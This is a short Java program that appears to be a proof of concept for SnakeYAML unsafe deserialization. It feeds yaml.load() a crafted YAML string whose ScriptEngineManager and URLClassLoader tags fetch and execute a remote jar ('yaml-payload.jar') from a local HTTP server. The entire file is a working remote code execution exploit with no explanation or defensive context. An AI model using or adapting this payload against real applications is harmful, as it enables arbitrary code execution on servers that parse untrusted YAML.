import org.yaml.snakeyaml.Yaml;

public class Main {
    public static void main(String[] args) {
        String context = "!!javax.script.ScriptEngineManager [\n" +
                "  !!java.net.URLClassLoader [[\n" +
                "    !!java.net.URL [\"http://127.0.0.1:8888/yaml-payload.jar\"]\n" +
                "  ]]\n" +
                "]";
        Yaml yaml = new Yaml();
        yaml.load(context);
    }
}
